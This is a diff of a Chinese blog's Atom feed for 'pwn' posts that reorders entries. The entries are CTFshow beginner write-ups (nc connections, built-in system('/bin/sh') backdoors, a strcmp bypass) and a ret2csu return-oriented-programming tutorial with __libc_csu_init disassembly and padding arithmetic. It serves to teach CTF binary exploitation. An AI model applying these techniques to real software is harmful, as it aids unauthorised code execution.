@@ -4,16 +4,18 @@
     <title>Blog • Posts by &#34;pwn&#34; tag</title>
     <link href="https://vvwwvv.cn" />
     <updated>2023-09-18T11:53:15.000Z</updated>
+    <category term="Java" />
     <category term="pwn" />
     <category term="二进制" />
+    <category term="C语言" />
     <category term="Linux" />
     <category term="ret2csu" />
-    <category term="ctf" />
-    <category term="系统调用" />
-    <category term="Java" />
-    <category term="C语言" />
     <category term="fastbin.attack" />
+    <category term="ctf" />
     <category term="nc" />
+    <category term="系统调用" />
+    <category term="windows" />
+    <category term="渗透" />
     <entry>
         <id>https://vvwwvv.cn/2023/09/18/pwn/gdb%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95/</id>
         <title>gdb本地调试，基于pwndbg</title>
@@ -109,6 +111,63 @@ pause()  #必要的，不能少
 </content>
         <category term="pwn" />
         <updated>2023-09-17T14:30:51.512Z</updated>
+    </entry>
+    <entry>
+        <id>https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow/</id>
+        <title>CTFshow(Test_your_nc部分,0~4)</title>
+        <link rel="alternate" href="https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow/"/>
+        <content type="html">&lt;h1 id=&#34;pwn0&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn0&#34;&gt;#&lt;/a&gt; pwn0&lt;/h1&gt;
+&lt;h2 id=&#34;题目&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWt1sS.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;利用 ssh 连接，不知道为什么之前连接是失败的&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWffpV.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;然后输入密码会加载一大堆东西&lt;/p&gt;
+&lt;p&gt;而且密码不在当前目录下需要到根目录查看&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWfLfx.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;pwn1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn1&#34;&gt;#&lt;/a&gt; pwn1&lt;/h1&gt;
+&lt;h2 id=&#34;题目-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-2&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWhgDe.md.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;题目里已经说明有后门了，下载附件利用 ida 打开&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWhqbQ.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;发现输出完句子之后会直接执行 cat flag，那么直接 nc 连接即可&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWhXUs.md.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;pwn2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn2&#34;&gt;#&lt;/a&gt; pwn2&lt;/h1&gt;
+&lt;h2 id=&#34;题目-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-3&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPW4pvT.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;下载附件查看程序信息，发现是 64 位程序&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPW4WsU.md.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;ida 打开&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWL4e0.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+发现有个 system (/bin/sh), 直接 给权限了，那么就直接可以获取 flag&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWL7YF.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;pwn3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn3&#34;&gt;#&lt;/a&gt; pwn3&lt;/h1&gt;
+&lt;h2 id=&#34;题目-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-4&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWLLl9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;查看保护是 64 位程序，ida 打开&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWLzTK.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWOCfe.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWOFld.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里考察我们对函数的理解&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;put 函数输出的是字符串&lt;/li&gt;
+&lt;li&gt;echo 主要用于打印简单的字符串和变量值&lt;/li&gt;
+&lt;li&gt;cat 用来查看文件内容，更侧重于处理文件，实现文件内容的读取和拼接等操作&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;(只有 system (cat /flag) 输出了 flag，选择 4 只会输出字符串”/ctfshow_flag“)&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWOllj.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;pwn4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn4&#34;&gt;#&lt;/a&gt; pwn4&lt;/h1&gt;
+&lt;h2 id=&#34;题目-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-5&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWOonI.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;查看程序是 64 位，用 ida 打开&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfDMex.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;execve_func()&lt;/code&gt;  里有后门&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfDlTK.md.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;strcmp(str1,str2)&lt;/code&gt;  该函数会进行比较，str1=str2 时会返回 0，所以输入 &lt;code&gt;CTFshowPWN&lt;/code&gt;  以此绕过判断&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfDPe0.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+</content>
+        <category term="pwn" />
+        <category term="nc" />
+        <updated>2023-09-15T03:01:15.000Z</updated>
     </entry>
     <entry>
         <id>https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow5-34/</id>
@@ -232,63 +291,6 @@ mov  eax,  [ecx+edx*2-6]  #eax=*(ecx+edx*2-6)
 &lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPhJc7Q.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 </content>
         <category term="pwn" />
-        <updated>2023-09-15T03:01:15.000Z</updated>
-    </entry>
-    <entry>
-        <id>https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow/</id>
-        <title>CTFshow(Test_your_nc部分,0~4)</title>
-        <link rel="alternate" href="https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow/"/>
-        <content type="html">&lt;h1 id=&#34;pwn0&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn0&#34;&gt;#&lt;/a&gt; pwn0&lt;/h1&gt;
-&lt;h2 id=&#34;题目&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWt1sS.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;利用 ssh 连接，不知道为什么之前连接是失败的&lt;br /&gt;
-&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWffpV.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;然后输入密码会加载一大堆东西&lt;/p&gt;
-&lt;p&gt;而且密码不在当前目录下需要到根目录查看&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWfLfx.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;h1 id=&#34;pwn1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn1&#34;&gt;#&lt;/a&gt; pwn1&lt;/h1&gt;
-&lt;h2 id=&#34;题目-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-2&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWhgDe.md.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;题目里已经说明有后门了，下载附件利用 ida 打开&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWhqbQ.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;发现输出完句子之后会直接执行 cat flag，那么直接 nc 连接即可&lt;br /&gt;
-&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWhXUs.md.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;h1 id=&#34;pwn2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn2&#34;&gt;#&lt;/a&gt; pwn2&lt;/h1&gt;
-&lt;h2 id=&#34;题目-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-3&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPW4pvT.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;下载附件查看程序信息，发现是 64 位程序&lt;br /&gt;
-&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPW4WsU.md.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;ida 打开&lt;br /&gt;
-&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWL4e0.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
-发现有个 system (/bin/sh), 直接 给权限了，那么就直接可以获取 flag&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWL7YF.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;h1 id=&#34;pwn3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn3&#34;&gt;#&lt;/a&gt; pwn3&lt;/h1&gt;
-&lt;h2 id=&#34;题目-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-4&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWLLl9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;查看保护是 64 位程序，ida 打开&lt;br /&gt;
-&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWLzTK.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWOCfe.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWOFld.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里考察我们对函数的理解&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;put 函数输出的是字符串&lt;/li&gt;
-&lt;li&gt;echo 主要用于打印简单的字符串和变量值&lt;/li&gt;
-&lt;li&gt;cat 用来查看文件内容，更侧重于处理文件，实现文件内容的读取和拼接等操作&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;(只有 system (cat /flag) 输出了 flag，选择 4 只会输出字符串”/ctfshow_flag“)&lt;br /&gt;
-&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWOllj.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;h1 id=&#34;pwn4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn4&#34;&gt;#&lt;/a&gt; pwn4&lt;/h1&gt;
-&lt;h2 id=&#34;题目-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-5&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWOonI.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;查看程序是 64 位，用 ida 打开&lt;br /&gt;
-&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfDMex.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;execve_func()&lt;/code&gt;  里有后门&lt;br /&gt;
-&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfDlTK.md.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;strcmp(str1,str2)&lt;/code&gt;  该函数会进行比较，str1=str2 时会返回 0，所以输入 &lt;code&gt;CTFshowPWN&lt;/code&gt;  以此绕过判断&lt;br /&gt;
-&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfDPe0.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-</content>
-        <category term="pwn" />
-        <category term="nc" />
         <updated>2023-09-15T03:01:15.000Z</updated>
     </entry>
     <entry>
@@ -743,76 +745,6 @@ pause()  #必要的，不能少
         <updated>2023-08-24T11:23:15.000Z</updated>
     </entry>
     <entry>
-        <id>https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu/</id>
-        <title>64位构造通用ROP，ret2csu</title>
-        <link rel="alternate" href="https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu/"/>
-        <content type="html">&lt;h1 id=&#34;ret2csu&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ret2csu&#34;&gt;#&lt;/a&gt; ret2csu&lt;/h1&gt;
-&lt;h2 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候我们很难找到每个寄存器对应的 gadges。这时候，我们可以利用 x64 下的__libc_csu_init 中的 gadgets。&lt;/li&gt;
-&lt;li&gt;这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;下面借用别人在ida摘出来的__libc_csu_init函数的汇编指令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下面借用别人在ida摘出来的__libc_csu_init函数的汇编指令&#34;&gt;#&lt;/a&gt; 下面借用别人在 IDA 摘出来的__libc_csu_init 函数的汇编指令&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;.text:00000000004011B0 ; void _libc_csu_init(void)
-.text:00000000004011B0                 public __libc_csu_init
-.text:00000000004011B0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
-.text:00000000004011B0 ; __unwind &amp;#123;
-.text:00000000004011B0                 push    r15
-.text:00000000004011B2                 mov     r15, rdx
-.text:00000000004011B5                 push    r14
-.text:00000000004011B7                 mov     r14, rsi
-.text:00000000004011BA                 push    r13
-.text:00000000004011BC                 mov     r13d, edi
-.text:00000000004011BF                 push    r12
-.text:00000000004011C1                 lea     r12, __frame_dummy_init_array_entry
-.text:00000000004011C8                 push    rbp
-.text:00000000004011C9                 lea     rbp, __do_global_dtors_aux_fini_array_entry
-.text:00000000004011D0                 push    rbx
-.text:00000000004011D1                 sub     rbp, r12
-.text:00000000004011D4                 sub     rsp, 8
-.text:00000000004011D8                 call    _init_proc
-.text:00000000004011DD                 sar     rbp, 3
-.text:00000000004011E1                 jz      short loc_4011FE
-.text:00000000004011E3                 xor     ebx, ebx
-.text:00000000004011E5                 nop     dword ptr [rax]
-.text:00000000004011E8
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;gadgets2:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;.text:00000000004011E8 loc_4011E8:                             ; CODE XREF: __libc_csu_init+4C↓j
-.text:00000000004011E8                 mov     rdx, r15
-.text:00000000004011EB                 mov     rsi, r14
-.text:00000000004011EE                 mov     edi, r13d
-.text:00000000004011F1                 call    qword ptr [r12+rbx*8]
-.text:00000000004011F5                 add     rbx, 1
-.text:00000000004011F9                 cmp     rbp, rbx
-.text:00000000004011FC                 jnz     short loc_4011E8
-.text:00000000004011FE
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;gadgets1:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;.text:00000000004011FE loc_4011FE:                             ; CODE XREF: __libc_csu_init+31↑j
-.text:00000000004011FE                 add     rsp, 8
-.text:0000000000401202                 pop     rbx
-.text:0000000000401203                 pop     rbp
-.text:0000000000401204                 pop     r12
-.text:0000000000401206                 pop     r13
-.text:0000000000401208                 pop     r14
-.text:000000000040120A                 pop     r15
-.text:000000000040120C                 retn
-.text:000000000040120C ; &amp;#125; // starts at 4011B0
-.text:000000000040120C __libc_csu_init endp
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里搬运之前在 CSDN 上发的文章（汇编代码执行顺序为先 gadgets2, 然后 gadgets1）&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/8abb18a591a445808abc86226a99d2c9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;pop 命令 会把栈中的值存入相应的寄存器中，那么我们可以通过往栈中写对应的数据来存入寄存器里&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/8400e847c08a419ba7c04f174dc26712.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;cmp&lt;/span&gt;     rbx, rbp   //cpm后的不同的调整指令有着不同的作用，这里 jnz 比较结果相同不跳转，不相同就跳转&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;jnz     short loc_400580&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;最后第二次回到 gadget1 时，此时已经给寄存器赋值完毕只需要回到 ret，此处填充 56 个 padding 字符是因为在地址 0x4011FE 处有   &lt;code&gt;add rsp , 8 &lt;/code&gt;  这会把 rsp 栈提高 8，所以要填充 8 个字符来站这个位置，后面的  &lt;code&gt;pop rbx ~ pop r15&lt;/code&gt;  共有 6 个寄存器，pop 了 6 次，所以总共是 （6+1）*8=56，所以填充 56 个字符即可到 ret 来控制程序执行&lt;/p&gt;
-&lt;p&gt;例题:&lt;a href=&#34;https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/&#34; title=&#34;ret2csu&#34;&gt;https://vvwwvv.cn/2023/05/04/pwn/ 刷题 / 看雪社区 / 看雪社区 pwn8 (64 位构造通用 ROP,ret2csu)/&lt;/a&gt;&lt;/p&gt;
-</content>
-        <category term="pwn" />
-        <category term="ret2csu" />
-        <updated>2023-08-24T11:23:15.000Z</updated>
-    </entry>
-    <entry>
         <id>https://vvwwvv.cn/2023/08/24/pwn/c%E5%87%BD%E6%95%B0%E5%8F%8A%E6%BC%8F%E6%B4%9E/</id>
         <title>C语言函数及漏洞利用</title>
         <link rel="alternate" href="https://vvwwvv.cn/2023/08/24/pwn/c%E5%87%BD%E6%95%B0%E5%8F%8A%E6%BC%8F%E6%B4%9E/"/>
@@ -885,6 +817,76 @@ fread不区分文件尾和错误，因此调用者必须用feof和ferror才能�
         <updated>2023-08-24T11:23:15.000Z</updated>
     </entry>
     <entry>
+        <id>https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu/</id>
+        <title>64位构造通用ROP，ret2csu</title>
+        <link rel="alternate" href="https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu/"/>
+        <content type="html">&lt;h1 id=&#34;ret2csu&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ret2csu&#34;&gt;#&lt;/a&gt; ret2csu&lt;/h1&gt;
+&lt;h2 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候我们很难找到每个寄存器对应的 gadges。这时候，我们可以利用 x64 下的__libc_csu_init 中的 gadgets。&lt;/li&gt;
+&lt;li&gt;这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;下面借用别人在ida摘出来的__libc_csu_init函数的汇编指令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下面借用别人在ida摘出来的__libc_csu_init函数的汇编指令&#34;&gt;#&lt;/a&gt; 下面借用别人在 IDA 摘出来的__libc_csu_init 函数的汇编指令&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;.text:00000000004011B0 ; void _libc_csu_init(void)
+.text:00000000004011B0                 public __libc_csu_init
+.text:00000000004011B0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
+.text:00000000004011B0 ; __unwind &amp;#123;
+.text:00000000004011B0                 push    r15
+.text:00000000004011B2                 mov     r15, rdx
+.text:00000000004011B5                 push    r14
+.text:00000000004011B7                 mov     r14, rsi
+.text:00000000004011BA                 push    r13
+.text:00000000004011BC                 mov     r13d, edi
+.text:00000000004011BF                 push    r12
+.text:00000000004011C1                 lea     r12, __frame_dummy_init_array_entry
+.text:00000000004011C8                 push    rbp
+.text:00000000004011C9                 lea     rbp, __do_global_dtors_aux_fini_array_entry
+.text:00000000004011D0                 push    rbx
+.text:00000000004011D1                 sub     rbp, r12
+.text:00000000004011D4                 sub     rsp, 8
+.text:00000000004011D8                 call    _init_proc
+.text:00000000004011DD                 sar     rbp, 3
+.text:00000000004011E1                 jz      short loc_4011FE
+.text:00000000004011E3                 xor     ebx, ebx
+.text:00000000004011E5                 nop     dword ptr [rax]
+.text:00000000004011E8
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;gadgets2:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;.text:00000000004011E8 loc_4011E8:                             ; CODE XREF: __libc_csu_init+4C↓j
+.text:00000000004011E8                 mov     rdx, r15
+.text:00000000004011EB                 mov     rsi, r14
+.text:00000000004011EE                 mov     edi, r13d
+.text:00000000004011F1                 call    qword ptr [r12+rbx*8]
+.text:00000000004011F5                 add     rbx, 1
+.text:00000000004011F9                 cmp     rbp, rbx
+.text:00000000004011FC                 jnz     short loc_4011E8
+.text:00000000004011FE
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;gadgets1:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;.text:00000000004011FE loc_4011FE:                             ; CODE XREF: __libc_csu_init+31↑j
+.text:00000000004011FE                 add     rsp, 8
+.text:0000000000401202                 pop     rbx
+.text:0000000000401203                 pop     rbp
+.text:0000000000401204                 pop     r12
+.text:0000000000401206                 pop     r13
+.text:0000000000401208                 pop     r14
+.text:000000000040120A                 pop     r15
+.text:000000000040120C                 retn
+.text:000000000040120C ; &amp;#125; // starts at 4011B0
+.text:000000000040120C __libc_csu_init endp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里搬运之前在 CSDN 上发的文章（汇编代码执行顺序为先 gadgets2, 然后 gadgets1）&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/8abb18a591a445808abc86226a99d2c9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;pop 命令 会把栈中的值存入相应的寄存器中，那么我们可以通过往栈中写对应的数据来存入寄存器里&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/8400e847c08a419ba7c04f174dc26712.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;cmp&lt;/span&gt;     rbx, rbp   //cpm后的不同的调整指令有着不同的作用，这里 jnz 比较结果相同不跳转，不相同就跳转&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;jnz     short loc_400580&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;最后第二次回到 gadget1 时，此时已经给寄存器赋值完毕只需要回到 ret，此处填充 56 个 padding 字符是因为在地址 0x4011FE 处有   &lt;code&gt;add rsp , 8 &lt;/code&gt;  这会把 rsp 栈提高 8，所以要填充 8 个字符来站这个位置，后面的  &lt;code&gt;pop rbx ~ pop r15&lt;/code&gt;  共有 6 个寄存器，pop 了 6 次，所以总共是 （6+1）*8=56，所以填充 56 个字符即可到 ret 来控制程序执行&lt;/p&gt;
+&lt;p&gt;例题:&lt;a href=&#34;https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/&#34; title=&#34;ret2csu&#34;&gt;https://vvwwvv.cn/2023/05/04/pwn/ 刷题 / 看雪社区 / 看雪社区 pwn8 (64 位构造通用 ROP,ret2csu)/&lt;/a&gt;&lt;/p&gt;
+</content>
+        <category term="pwn" />
+        <category term="ret2csu" />
+        <updated>2023-08-24T11:23:15.000Z</updated>
+    </entry>
+    <entry>
         <id>https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/buuctf-pwn/</id>
         <title>buuctf.pwn</title>
         <link rel="alternate" href="https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/buuctf-pwn/"/>
@@ -907,6 +909,33 @@ fread不区分文件尾和错误，因此调用者必须用feof和ferror才能�
 </content>
         <category term="pwn" />
         <category term="二进制" />
+        <category term="ctf" />
+        <updated>2023-05-04T11:33:55.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/</id>
+        <title>看雪社区pwn8（64位构造通用ROP，ret2csu）</title>
